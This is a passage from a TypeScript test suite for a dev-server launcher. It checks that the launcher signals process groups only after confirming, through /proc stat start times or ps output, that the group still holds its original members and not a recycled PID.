  unlistable = false;
  readonly signals: [number, NodeJS.Signals | 0][] = [];
  onSignal: (pgid: number, signal: NodeJS.Signals | 0) => void = () => undefined;
  readonly listed = vi.fn<(pgid: number) => void>();

  constructor(processes: readonly ProcessIdentity[]) {
    this.processes = [...processes];
  }

  readonly signalProcessGroup: SignalProcessGroup = (pgid, signal) => {
    this.signals.push([pgid, signal]);
    if (!this.processes.some((process) => process.pgid === pgid)) {
      throw errnoError('ESRCH');
    }
    this.onSignal(pgid, signal);
  };

  readonly inspector: ProcessGroupInspector = {
    members: (pgid) => {
      this.listed(pgid);
      return Promise.resolve(
        this.unlistable
          ? undefined
          : this.processes
              .filter((process) => process.pgid === pgid)
              .map((process) => ({ ...process })),
      );
    },
  };

  /** Remove one process, as its exit does. */
  remove(pid: number): void {
    this.processes = this.processes.filter((process) => process.pid !== pid);
  }

  /** Remove every process of a group, as a `SIGKILL` to it does. */
  endGroup(pgid: number): void {
    this.processes = this.processes.filter((process) => process.pgid !== pgid);
  }
}

/** The first child as its group's leader, and the worker it started. */
function originalGroup(): ProcessIdentity[] {
  return [
    { pid: FIRST_PID, pgid: FIRST_PID, startToken: LEADER_TOKEN },
    { pid: WORKER_PID, pgid: FIRST_PID, startToken: WORKER_TOKEN },
  ];
}

describe('DevServerLauncher: process-group identity after the leader exits (CWE-367)', () => {
  /** A harness whose group signals and listings go to `table` only. */
  function groupHarness(table: ProcessTable): Harness {
    return createHarness({
      deps: {
        signalProcessGroup: table.signalProcessGroup,
        processGroupInspector: table.inspector,
      },
    });
  }

  /** The unverified-group records a harness logged. */
  function unverifiedRecords(harness: Harness): LogRecord[] {
    return harness.records.filter((record) => record.message === UNVERIFIED_GROUP_MESSAGE);
  }

  it('pins the group while the leader lives: at spawn and again once the child is ready', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    const harness = groupHarness(table);

    await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    expect(table.listed).toHaveBeenCalledTimes(2);
    expect(table.listed).toHaveBeenNthCalledWith(1, FIRST_PID);
    expect(table.listed).toHaveBeenNthCalledWith(2, FIRST_PID);
    expect(table.signals).toEqual([]);
    expect(harness.spawner.call(0).options.detached).toBe(true);
  });

  it('never signals a group id recycled after the leader exited on its own, and logs why once', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    const harness = groupHarness(table);
    const { child } = await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    // The leader and its worker are gone; the kernel handed the id to an
    // unrelated process that leads a group of the same number.
    table.processes = [{ pid: FIRST_PID, pgid: FIRST_PID, startToken: RECYCLED_TOKEN }];
    child.finish(0, null);
    await vi.advanceTimersByTimeAsync(5_000);

    expect(table.signals).toEqual([]);
    const records = unverifiedRecords(harness);
    expect(records).toHaveLength(1);
    expect(records[0]?.level).toBe('warn');
    expect(records[0]?.fields).toMatchObject({
      projectRoot: harness.projectRoot,
      pid: FIRST_PID,
      verdict: 'foreign',
    });

    // Its later stop and the shutdown send nothing to the id either.
    expectOk(await harness.launcher.stop({ projectRoot: harness.projectRoot }));
    await harness.launcher.dispose();
    expect(table.signals).toEqual([]);
    expect(unverifiedRecords(harness)).toHaveLength(1);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('reaps an original worker the leader left behind: SIGTERM, SIGKILL after the grace, then nothing', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    // The worker ignores SIGTERM; SIGKILL ends the whole group.
    table.onSignal = (pgid, signal) => {
      if (signal === 'SIGKILL') {
        table.endGroup(pgid);
      }
    };
    const harness = groupHarness(table);
    const { child } = await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    table.remove(FIRST_PID);
    child.finish(1, null);
    await vi.advanceTimersByTimeAsync(0);
    expect(table.signals).toEqual([[FIRST_PID, 'SIGTERM']]);

    await vi.advanceTimersByTimeAsync(999);
    expect(table.signals).toEqual([[FIRST_PID, 'SIGTERM']]);
    await vi.advanceTimersByTimeAsync(1);
    expect(table.signals).toEqual([
      [FIRST_PID, 'SIGTERM'],
      [FIRST_PID, 'SIGKILL'],
    ]);
    expect(table.processes).toEqual([]);

    await vi.advanceTimersByTimeAsync(10_000);
    expect(table.signals).toHaveLength(2);
    expect(unverifiedRecords(harness)).toEqual([]);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('stops reaping as soon as the verified members are gone: SIGTERM alone when it suffices', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    table.onSignal = (pgid, signal) => {
      if (signal === 'SIGTERM') {
        table.endGroup(pgid);
      }
    };
    const harness = groupHarness(table);
    const { child } = await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    table.remove(FIRST_PID);
    child.finish(1, null);
    await vi.advanceTimersByTimeAsync(5_000);

    expect(table.signals).toEqual([[FIRST_PID, 'SIGTERM']]);
    expect(unverifiedRecords(harness)).toEqual([]);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('never signals the group when it cannot be listed after the leader exited', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    const harness = groupHarness(table);
    const { child } = await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    table.unlistable = true;
    table.remove(FIRST_PID);
    child.finish(1, null);
    await vi.advanceTimersByTimeAsync(5_000);

    expect(table.signals).toEqual([]);
    expect(unverifiedRecords(harness).map((record) => record.fields)).toEqual([
      expect.objectContaining({
        projectRoot: harness.projectRoot,
        pid: FIRST_PID,
        verdict: 'unknown',
      }),
    ]);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('never signals a group after its leader exits when a signaller is injected without an inspector', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    const harness = createHarness({ deps: { signalProcessGroup: table.signalProcessGroup } });
    const { child } = await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    table.remove(FIRST_PID);
    child.finish(1, null);
    await vi.advanceTimersByTimeAsync(5_000);

    expect(table.signals).toEqual([]);
    expect(table.listed).not.toHaveBeenCalled();
    expect(unverifiedRecords(harness).map((record) => record.fields)).toEqual([
      expect.objectContaining({ pid: FIRST_PID, verdict: 'unknown' }),
    ]);
  });

  it('signals the group directly while the leader is unreaped: SIGTERM, then SIGKILL for a leader that ignores it', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    const harness = groupHarness(table);
    const { child } = await launchReady(harness);
    table.onSignal = (pgid, signal) => {
      if (signal === 'SIGKILL') {
        table.endGroup(pgid);
        child.finish(null, 'SIGKILL');
      }
    };

    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(1_000);

    expect(expectOk(await stopping)).toStrictEqual({ stopped: true });
    expect(table.signals).toEqual([
      [FIRST_PID, 'SIGTERM'],
      [FIRST_PID, 'SIGKILL'],
    ]);
    // Group signalling reached the leader; `child.kill` was never needed.
    expect(child.signals).toEqual([]);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('stops a leader that exits on SIGTERM and kills the pinned worker it left once the grace passes', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    const harness = groupHarness(table);
    const { child } = await launchReady(harness);
    table.onSignal = (pgid, signal) => {
      if (signal === 'SIGTERM') {
        table.remove(FIRST_PID);
        child.finish(null, 'SIGTERM');
      } else if (signal === 'SIGKILL') {
        table.endGroup(pgid);
      }
    };

    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(999);
    expect(table.signals).toEqual([[FIRST_PID, 'SIGTERM']]);
    await vi.advanceTimersByTimeAsync(1);

    expect(expectOk(await stopping)).toStrictEqual({ stopped: true });
    expect(table.signals).toEqual([
      [FIRST_PID, 'SIGTERM'],
      [FIRST_PID, 'SIGKILL'],
    ]);
    expect(
      harness.records.find((record) => record.message === 'Stopped a launched dev server')?.fields,
    ).toMatchObject({ pid: FIRST_PID, escalated: true, exitObserved: true });
    expect(vi.getTimerCount()).toBe(0);
  });

  it('sends no SIGKILL when the group id is recycled while the stop waits for the worker', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    const harness = groupHarness(table);
    const { child } = await launchReady(harness);
    table.onSignal = (_pgid, signal) => {
      if (signal === 'SIGTERM') {
        // The leader and the worker end; the id is handed to an unrelated group.
        table.processes = [{ pid: FIRST_PID, pgid: FIRST_PID, startToken: RECYCLED_TOKEN }];
        child.finish(null, 'SIGTERM');
      }
    };

    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(5_000);

    expect(expectOk(await stopping)).toStrictEqual({ stopped: true });
    expect(table.signals).toEqual([[FIRST_PID, 'SIGTERM']]);
    expect(unverifiedRecords(harness).map((record) => record.fields)).toEqual([
      expect.objectContaining({ pid: FIRST_PID, verdict: 'foreign' }),
    ]);
    expect(
      harness.records.find((record) => record.message === 'Stopped a launched dev server')?.fields,
    ).toMatchObject({ pid: FIRST_PID, escalated: false });
    expect(vi.getTimerCount()).toBe(0);
  });

  it('treats a malformed inspector answer as a group it cannot verify', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    let exited = false;
    const inspector: ProcessGroupInspector = {
      members: (pgid) =>
        exited
          ? (Promise.resolve([{ pid: 'seven', pgid, startToken: 42 }]) as unknown as Promise<
              readonly ProcessIdentity[]
            >)
          : table.inspector.members(pgid),
    };
    const harness = createHarness({
      deps: { signalProcessGroup: table.signalProcessGroup, processGroupInspector: inspector },
    });
    const { child } = await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    exited = true;
    table.remove(FIRST_PID);
    child.finish(1, null);
    await vi.advanceTimersByTimeAsync(5_000);

    expect(table.signals).toEqual([]);
    expect(unverifiedRecords(harness).map((record) => record.fields)).toEqual([
      expect.objectContaining({ verdict: 'unknown' }),
    ]);
  });
});

describe('DevServerLauncher: a pinned member is confirmed in the same step that delivers a group signal', () => {
  /** The confirmation a case scripts, typed as the inspector declares it. */
  type ConfirmFn = (identity: ProcessIdentity) => boolean | undefined;

  /** The worker every case pins while the leader lives. */
  const PINNED_WORKER: ProcessIdentity = Object.freeze({
    pid: WORKER_PID,
    pgid: FIRST_PID,
    startToken: WORKER_TOKEN,
  });

  /** A harness whose group signals and listings go to `table`, confirming through `confirm`. */
  function confirmingHarness(table: ProcessTable, confirm: ConfirmFn): Harness {
    return createHarness({
      deps: {
        signalProcessGroup: table.signalProcessGroup,
        processGroupInspector: { members: (pgid) => table.inspector.members(pgid), confirm },
      },
    });
  }

  /** The unverified-group records a harness logged. */
  function unverifiedRecords(harness: Harness): LogRecord[] {
    return harness.records.filter((record) => record.message === UNVERIFIED_GROUP_MESSAGE);
  }

  it('never signals a group whose pinned member was recycled between a successful listing and the delivery', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    // The listing still holds the pinned worker; by the delivery its pid
    // belongs to a process that started later, which the confirmation sees.
    const confirm = vi.fn<ConfirmFn>(() => false);
    const harness = confirmingHarness(table, confirm);
    const { child } = await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    table.remove(FIRST_PID);
    child.finish(1, null);
    await vi.advanceTimersByTimeAsync(5_000);

    expect(confirm).toHaveBeenCalledExactlyOnceWith(PINNED_WORKER);
    expect(table.signals).toEqual([]);
    // Released as gone: silently, and for good.
    expect(unverifiedRecords(harness)).toEqual([]);
    expectOk(await harness.launcher.stop({ projectRoot: harness.projectRoot }));
    await harness.launcher.dispose();
    expect(table.signals).toEqual([]);
    expect(confirm).toHaveBeenCalledOnce();
    expect(vi.getTimerCount()).toBe(0);
  });

  it('delivers the signal once a pinned member confirms, running nothing between the confirmation and the delivery', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    const events: string[] = [];
    table.onSignal = (pgid, signal) => {
      events.push(`delivered ${String(signal)}`);
      table.endGroup(pgid);
    };
    const confirm = vi.fn<ConfirmFn>((identity) => {
      events.push('confirmed');
      // Queued work runs only after the current synchronous step: were there
      // an await between the confirmation and the delivery, this would end
      // the group first and the signal would reach no process.
      queueMicrotask(() => {
        table.endGroup(identity.pgid);
      });
      return true;
    });
    const harness = confirmingHarness(table, confirm);
    const { child } = await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    table.remove(FIRST_PID);
    child.finish(1, null);
    await vi.advanceTimersByTimeAsync(5_000);

    expect(confirm).toHaveBeenCalledExactlyOnceWith(PINNED_WORKER);
    expect(events).toEqual(['confirmed', 'delivered SIGTERM']);
    expect(table.signals).toEqual([[FIRST_PID, 'SIGTERM']]);
    expect(unverifiedRecords(harness)).toEqual([]);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('asks each pinned member of the listing in turn until one confirms', async () => {
    vi.useFakeTimers();
    const second: ProcessIdentity = {
      pid: WORKER_PID + 1,
      pgid: FIRST_PID,
      startToken: 'start-a-second-worker',
    };
    const table = new ProcessTable([...originalGroup(), second]);
    table.onSignal = (pgid) => {
      table.endGroup(pgid);
    };
    const confirm = vi.fn<ConfirmFn>((identity) => identity.pid === second.pid);
    const harness = confirmingHarness(table, confirm);
    const { child } = await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    table.remove(FIRST_PID);
    child.finish(1, null);
    await vi.advanceTimersByTimeAsync(5_000);

    expect(confirm.mock.calls).toStrictEqual([[PINNED_WORKER], [second]]);
    expect(table.signals).toEqual([[FIRST_PID, 'SIGTERM']]);
  });

  it.each([
    { label: 'cannot tell', confirm: (): boolean | undefined => undefined },
    {
      label: 'throws',
      confirm: (): boolean | undefined => {
        throw new Error('stat unreadable');
      },
    },
    { label: 'answers anything but true', confirm: () => 'yes' as unknown as boolean },
  ])('never signals, and logs nothing, when the confirmation $label', async ({ confirm }) => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    const harness = confirmingHarness(table, confirm);
    const { child } = await launchReady(harness);
    await vi.advanceTimersByTimeAsync(0);

    table.remove(FIRST_PID);
    child.finish(1, null);
    await vi.advanceTimersByTimeAsync(5_000);

    expect(table.signals).toEqual([]);
    expect(unverifiedRecords(harness)).toEqual([]);
    expect(vi.getTimerCount()).toBe(0);
  });

  it('sends no SIGKILL to a worker the stop left behind once its pin no longer confirms', async () => {
    vi.useFakeTimers();
    const table = new ProcessTable(originalGroup());
    const confirm = vi.fn<ConfirmFn>(() => false);
    const harness = confirmingHarness(table, confirm);
    const { child } = await launchReady(harness);
    table.onSignal = (_pgid, signal) => {
      if (signal === 'SIGTERM') {
        table.remove(FIRST_PID);
        child.finish(null, 'SIGTERM');
      }
    };

    const stopping = harness.launcher.stop({ projectRoot: harness.projectRoot });
    await vi.advanceTimersByTimeAsync(5_000);

    expect(expectOk(await stopping)).toStrictEqual({ stopped: true });
    // SIGTERM went to the group directly while the leader was unreaped, with
    // no confirmation needed; the escalation after its exit was confirmed.
    expect(table.signals).toEqual([[FIRST_PID, 'SIGTERM']]);
    expect(confirm).toHaveBeenCalledExactlyOnceWith(PINNED_WORKER);
    expect(unverifiedRecords(harness)).toEqual([]);
    expect(vi.getTimerCount()).toBe(0);
  });
});

/** A `/proc/<pid>/stat` line: the fields after the command name, up to and past the start time. */
function statLine(
  pid: number,
  comm: string,
  state: string,
  pgrp: number,
  starttime: number,
): string {
  const afterState = [1, pgrp, pgrp, 0, -1, 4_194_560, 100, 0, 0, 0, 1, 2, 0, 0, 20, 0, 1, 0];
  return `${String(pid)} (${comm}) ${state} ${afterState.join(' ')} ${String(starttime)} 1000 50\n`;
}

describe('createProcessGroupInspector on Linux (injected /proc)', () => {
  /** A `/proc` holding the stat files given, listing `names` at its root. */
  function groupProc(
    stats: Readonly<Record<number, string>>,
    names: readonly string[] = ['self', 'net', ...Object.keys(stats)],
    denied: readonly string[] = [],
  ) {
    return fakeProc({
      files: Object.fromEntries(
        Object.entries(stats).map(([pid, stat]) => [`/proc/${pid}/stat`, stat]),
      ),
      dirs: { '/proc': names },
      denied,
    });
  }

  it('lists the live members of a group, reading past the last ")" and skipping zombies and other groups', async () => {
    const proc = groupProc({
      1: statLine(1, 'init', 'S', 1, 5),
      7301: statLine(7301, 'pnpm', 'S', 7301, 9_001),
      7302: statLine(7302, 'next-server (v16) ) S 1 999', 'R', 7301, 9_002),
      7303: statLine(7303, 'sh', 'Z', 7301, 9_003),
      7304: statLine(7304, 'reaped', 'X', 7301, 9_004),
      7305: statLine(7305, 'elsewhere', 'S', 7400, 9_005),
    });
    const inspector = createProcessGroupInspector({ platform: 'linux', fs: proc.fs });

    const members = await inspector.members(7301);

    expect(members).toStrictEqual([
      { pid: 7301, pgid: 7301, startToken: '9001' },
      { pid: 7302, pgid: 7301, startToken: '9002' },
    ]);
    expect(Object.isFrozen(members)).toBe(true);
  });

  it('skips a process that vanished mid-listing, and answers an empty group as empty', async () => {
    const proc = groupProc({ 7301: statLine(7301, 'pnpm', 'S', 7301, 9_001) }, ['7301', '7309']);
    const inspector = createProcessGroupInspector({ platform: 'linux', fs: proc.fs });

    expect(await inspector.members(7301)).toStrictEqual([
      { pid: 7301, pgid: 7301, startToken: '9001' },
    ]);
    expect(await inspector.members(8000)).toStrictEqual([]);
  });

  it.each([
    {
      label: 'a stat file it may not read',
      proc: () =>
        groupProc(
          { 7301: statLine(7301, 'pnpm', 'S', 7301, 9_001) },
          ['7301'],
          ['/proc/7301/stat'],
        ),
    },
    { label: 'an unreadable /proc', proc: () => groupProc({}, [], ['/proc']) },
    { label: 'a stat line with no ")"', proc: () => groupProc({ 7301: '7301 pnpm S 1 7301' }) },
    {
      label: 'a stat line cut before the start time',
      proc: () => groupProc({ 7301: '7301 (pnpm) S 1 7301 7301 0 -1 4194560' }),
    },
  ])('cannot tell for $label', async ({ proc }) => {
    const inspector = createProcessGroupInspector({ platform: 'linux', fs: proc().fs });

    expect(await inspector.members(7301)).toBeUndefined();
  });

  it.each([0, -7301, 1.5, Number.NaN])(
    'cannot tell for the group id %s, reading nothing',
    async (pgid) => {
      const proc = groupProc({ 7301: statLine(7301, 'pnpm', 'S', 7301, 9_001) });
      const inspector = createProcessGroupInspector({ platform: 'linux', fs: proc.fs });

      expect(await inspector.members(pgid)).toBeUndefined();
      expect(proc.calls).toEqual([]);
    },
  );

  it('never throws, even for a filesystem that throws synchronously', async () => {
    const throwing: ListenerOwnershipFs = {
      readdir: () => {
        throw new Error('broken');
      },
      readFile: () => {
        throw new Error('broken');
      },
      readlink: () => {
        throw new Error('broken');
      },
    };
    const inspector = createProcessGroupInspector({ platform: 'android', fs: throwing });

    await expect(inspector.members(7301)).resolves.toBeUndefined();
  });

  it.runIf(process.platform === 'linux')(
    'lists this process in its own group from the real /proc, under a stable start token',
    async () => {
      const stat = readFileSync('/proc/self/stat', 'utf8');
      const pgid = Number(
        stat
          .slice(stat.lastIndexOf(')') + 1)
          .trim()
          .split(/\s+/)[2],
      );
      const inspector = createProcessGroupInspector({ platform: 'linux' });

      const first = await inspector.members(pgid);
      const second = await inspector.members(pgid);

      const own = first?.find((member) => member.pid === process.pid);
      expect(own).toMatchObject({ pid: process.pid, pgid });
      expect(own?.startToken).toMatch(/^\d+$/);
      expect(second?.find((member) => member.pid === process.pid)?.startToken).toBe(
        own?.startToken,
      );
      for (const member of first ?? []) {
        expect(member.pgid).toBe(pgid);
      }
    },
  );
});

describe('createProcessGroupInspector: the synchronous confirmation', () => {
  /** A synchronous reader over `/proc/<pid>/stat` texts, throwing an errno error for any other path. */
  function statReader(
    files: Readonly<Record<string, string>>,
    missing: string = 'ENOENT',
  ): { readonly read: (path: string) => string; readonly calls: string[] } {
    const calls: string[] = [];
    return {
      calls,
      read: (path) => {
        calls.push(path);
        const text = files[path];
        if (text === undefined) {
          throw errnoError(missing);
        }
        return text;
      },
    };
  }

  const PINNED: ProcessIdentity = Object.freeze({ pid: 7302, pgid: 7301, startToken: '9002' });

  it.each([
    {
      label: 'the same pid, group and start time',
      stat: statLine(7302, 'next-server (v16) ) S 1 999', 'S', 7301, 9_002),
      expected: true,
    },
    {
      label: 'a different start time: the pid was recycled',
      stat: statLine(7302, 'node', 'S', 7301, 12_345),
      expected: false,
    },
    {
      label: 'another process group',
      stat: statLine(7302, 'node', 'S', 7400, 9_002),
      expected: false,
    },
    { label: 'a zombie', stat: statLine(7302, 'node', 'Z', 7301, 9_002), expected: false },
    { label: 'a dead entry', stat: statLine(7302, 'node', 'X', 7301, 9_002), expected: false },
    { label: 'a line with no ")"', stat: '7302 node S 1 7301 7301', expected: undefined },
    {
      label: 'a line cut before the start time',
      stat: '7302 (node) S 1 7301 7301 0 -1 4194560',
      expected: undefined,
    },
  ])(
    'answers $expected for $label, reading /proc/<pid>/stat synchronously',
    ({ stat, expected }) => {
      const reader = statReader({ '/proc/7302/stat': stat });
      const inspector = createProcessGroupInspector({
        platform: 'linux',
        readFileSync: reader.read,
      });

      expect(inspector.confirm?.(PINNED)).toBe(expected);
      expect(reader.calls).toEqual(['/proc/7302/stat']);
    },
  );

  it.each(['ENOENT', 'ESRCH'])('answers false when the process is gone (%s)', (code) => {
    const reader = statReader({}, code);
    const inspector = createProcessGroupInspector({
      platform: 'android',
      readFileSync: reader.read,
    });

    expect(inspector.confirm?.(PINNED)).toBe(false);
  });

  it('cannot tell for a stat file it may not read, a non-text answer, or an identity that is none', () => {
    const denied = createProcessGroupInspector({
      platform: 'linux',
      readFileSync: statReader({}, 'EACCES').read,
    });
    expect(denied.confirm?.(PINNED)).toBeUndefined();

    const nonText = createProcessGroupInspector({
      platform: 'linux',
      readFileSync: () => 42 as unknown as string,
    });
    expect(nonText.confirm?.(PINNED)).toBeUndefined();

    const reader = statReader({ '/proc/7302/stat': statLine(7302, 'node', 'S', 7301, 9_002) });
    const inspector = createProcessGroupInspector({ platform: 'linux', readFileSync: reader.read });
    for (const identity of [
      { pid: 0, pgid: 7301, startToken: '9002' },
      { pid: 7302, pgid: -1, startToken: '9002' },
      { pid: 7302, pgid: 7301, startToken: 9_002 as unknown as string },
    ]) {
      expect(inspector.confirm?.(identity)).toBeUndefined();
    }
    expect(reader.calls).toEqual([]);
  });

  it('never throws: an uncoded read failure or an identity whose fields throw cannot tell', () => {
    const uncoded = createProcessGroupInspector({
      platform: 'linux',
      readFileSync: () => {
        throw new Error('broken');
      },
    });
    expect(uncoded.confirm?.(PINNED)).toBeUndefined();

    const hostile = Object.defineProperty({ pgid: 7301, startToken: '9002' }, 'pid', {
      get: (): never => {
        throw new Error('hostile');
      },
    }) as unknown as ProcessIdentity;
    const inspector = createProcessGroupInspector({
      platform: 'linux',
      readFileSync: statReader({}).read,
    });
    expect(inspector.confirm?.(hostile)).toBeUndefined();
  });

  it('offers no confirmation where it could only block the event loop or there are no groups', () => {
    for (const platform of ['darwin', 'freebsd', 'win32'] as const) {
      const inspector = createProcessGroupInspector({
        platform,
        runCommand: scriptedCommands().run,
      });
      expect(typeof inspector.confirm).toBe('undefined');
      expect('confirm' in inspector).toBe(false);
    }
  });

  it.runIf(process.platform === 'linux')(
    'confirms this very process from the real /proc under the identity its own listing reports',
    async () => {
      const stat = readFileSync('/proc/self/stat', 'utf8');
      const pgid = Number(
        stat
          .slice(stat.lastIndexOf(')') + 1)
          .trim()
          .split(/\s+/)[2],
      );
      const inspector = createProcessGroupInspector({ platform: 'linux' });
      const own = (await inspector.members(pgid))?.find((member) => member.pid === process.pid);
      if (own === undefined) {
        throw new Error('this process is missing from its own group listing');
      }

      expect(inspector.confirm?.(own)).toBe(true);
      expect(inspector.confirm?.({ ...own, startToken: `${own.startToken}0` })).toBe(false);
      expect(inspector.confirm?.({ ...own, pgid: own.pgid + 1 })).toBe(false);
    },
  );
});

describe('createProcessGroupInspector on macOS, other POSIX systems and Windows', () => {
  /** `ps -A -o pid= -o pgid= -o stat= -o lstart=` for group 500: its leader, a worker and a zombie. */
  const PS_GROUP_TABLE = [
    '    1     1 Ss   Mon Jan  6 09:00:00 2025',
    '  500   500 S    Tue Jan  7 10:15:02 2025',
    '  501   500 S+   Tue Jan  7 10:15:03 2025',
    '  502   500 Z    Tue Jan  7 10:15:04 2025',
    '  777   777 S    Tue Jan  7 11:00:00 2025',
    '',
  ].join('\n');

  it('lists a group from one ps run at the fixed macOS path, lstart as the token, zombies skipped', async () => {
    const commands = scriptedCommands(exited(0, PS_GROUP_TABLE));
    const inspector = createProcessGroupInspector({
      platform: 'darwin',
      runCommand: commands.run,
      env: { PATH: '/usr/bin', ANTHROPIC_API_KEY: fixtureSecret('provider') },
    });

    expect(await inspector.members(500)).toStrictEqual([
      { pid: 500, pgid: 500, startToken: 'Tue Jan 7 10:15:02 2025' },
      { pid: 501, pgid: 500, startToken: 'Tue Jan 7 10:15:03 2025' },
    ]);
    expect(commands.calls.map(({ file, args }) => [file, args])).toEqual([
      ['/bin/ps', ['-A', '-o', 'pid=', '-o', 'pgid=', '-o', 'stat=', '-o', 'lstart=']],
    ]);
    expect(commands.calls[0]?.options).toStrictEqual({
      timeoutMs: DEFAULT_LISTENER_LOOKUP_TIMEOUT_MS,
      env: { PATH: '/usr/bin' },
    });
  });

  it('finds ps on the service PATH on other POSIX systems', async () => {
    const commands = scriptedCommands(exited(0, PS_GROUP_TABLE));
    const inspector = createProcessGroupInspector({
      platform: 'freebsd',
      runCommand: commands.run,
    });

    expect(await inspector.members(777)).toStrictEqual([
      { pid: 777, pgid: 777, startToken: 'Tue Jan 7 11:00:00 2025' },
    ]);
    expect(commands.calls[0]?.file).toBe('ps');
  });

  it.each([
    { label: 'a non-zero exit', outcome: exited(1, PS_GROUP_TABLE) },
    { label: 'a timeout', outcome: 'hang' as const },
    { label: 'a row in another shape', outcome: exited(0, `${PS_GROUP_TABLE}garbage\n`) },
    { label: 'a rejected run', outcome: new Error('spawn EACCES') },
  ])('cannot tell for $label', async ({ outcome }) => {
    const inspector = createProcessGroupInspector({
      platform: 'darwin',
      runCommand: scriptedCommands(outcome).run,
    });

    expect(await inspector.members(500)).toBeUndefined();
  });

  it('cannot tell on Windows, where there are no process groups, running nothing', async () => {
    const commands = scriptedCommands();
    const inspector = createProcessGroupInspector({ platform: 'win32', runCommand: commands.run });

    expect(await inspector.members(500)).toBeUndefined();
    expect(commands.calls).toEqual([]);
  });
});

describe('DevServerLauncher: a logger that throws', () => {
  it('escapes neither a launch nor a stop, and its dropped records are announced rather than hidden', async () => {
    const written: string[] = [];
    const stderrWrite = vi.spyOn(process.stderr, 'write').mockImplementation((chunk) => {
      written.push(typeof chunk === 'string' ? chunk : Buffer.from(chunk).toString('utf8'));
      return true;
    });
    const destinationClosed = (): never => {
      throw new Error('the log destination is closed');
    };
    const throwing: Logger = {
      level: 'trace',
      trace: destinationClosed,
      debug: destinationClosed,
      info: destinationClosed,
      warn: destinationClosed,
      error: destinationClosed,
      fatal: destinationClosed,
      child: () => throwing,
    };

    try {
      const harness = createHarness({ deps: { logger: throwing } });
      const { child } = await launchReady(harness);
      expect(expectOk(await harness.launcher.stop({ projectRoot: harness.projectRoot }))).toEqual({
        stopped: true,
      });
      expect(child.signals).toEqual(['SIGTERM']);
      expect(harness.issuer.revoke).toHaveBeenCalledTimes(1);
      expect(harness.launcher.list()).toEqual([]);
    } finally {
      stderrWrite.mockRestore();
    }

    // One notice for the whole burst (the guard is rate-limited), naming the
    // failure by its closed class and never by what the logger threw.
    const notices = written.filter((line) => line.includes(LOG_FAILURE_NOTICE_MESSAGE));
    expect(notices).toHaveLength(1);
    expect(JSON.parse(notices[0] ?? '{}')).toMatchObject({
      subsystem: 'logging',
      errorClass: 'Error',
      droppedRecords: 1,
    });
    expect(written.join('')).not.toContain('the log destination is closed');
  });
});
